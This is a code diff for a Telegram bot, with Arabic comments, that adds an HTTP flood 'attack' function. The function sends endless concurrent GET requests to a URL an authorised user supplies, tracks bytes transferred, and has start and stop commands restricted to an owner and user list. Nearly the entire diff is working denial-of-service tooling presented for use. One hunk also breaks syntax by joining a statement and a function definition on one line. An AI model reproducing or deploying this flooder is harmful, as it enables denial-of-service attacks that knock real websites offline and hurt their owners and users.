@@ -1,3 +1,58 @@
+import httpx
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import asyncio
+import os
+
+# قائمة المالكين والمستخدمين
+Owner = ['6358035274']
+NormalUsers = []
+
+def ensure_file_exists(filename):
+    """تأكد من وجود الملف، وإنشائه إذا لم يكن موجودًا"""
+    if not os.path.exists(filename):
+        with open(filename, 'w') as file:
+            pass  # فقط إنشاء الملف الفارغ
+
+def read_users():
+    ensure_file_exists('owners.txt')
+    ensure_file_exists('normal_users.txt')
+
+    try:
+        with open('owners.txt', 'r') as file:
+            Owner.extend(file.read().splitlines())
+    except Exception as e:
+        pass
+        
+    try:
+        with open('normal_users.txt', 'r') as file:
+            NormalUsers.extend(file.read().splitlines())
+    except Exception as e:
+        pass
+
+read_users()
+
+# متغيرات للتحكم في الهجوم
+bytes_transferred = 0
+lock = threading.Lock()
+stop_attack_event = threading.Event()
+
+async def attack(url):
+    """تنفيذ الهجوم عبر إرسال طلبات متتابعة"""
+    global bytes_transferred
+    async with httpx.AsyncClient() as client:
+        while not stop_attack_event.is_set():
+            try:
+                response = await client.get(url)
+                data = response.content
+                with lock:
+                    bytes_transferred += len(data)
+            except Exception:
+                pass
+
 async def start_attack(url):
     """بدء الهجوم عبر عدة خيوط"""
     stop_attack_event.clear()
@@ -60,9 +115,7 @@ def callback_query(call):
         bot.register_next_step_handler(msg, process_start_attack)
     elif call.data == "stop_attack":
         stop_attack()
-        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
-
-def process_add_user(message):
+        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")def process_add_user(message):
     """إضافة مستخدم إلى القائمة"""
     user_id = message.text.strip()
     if user_id and user_id not in NormalUsers:
@@ -89,7 +142,9 @@ def process_remove_user(message):
         except Exception:
             bot.reply_to(message, "حدث خطأ أثناء إزالة المستخدم.")
     else:
-        bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")def process_start_attack(message):
+        bot.reply_to(message, "المستخدم غير موجود في القائمة أو معرف المستخدم غير صحيح.")
+
+def process_start_attack(message):
     """بدء هجوم على الهدف المحدد"""
     url = message.text.strip()
     if url:
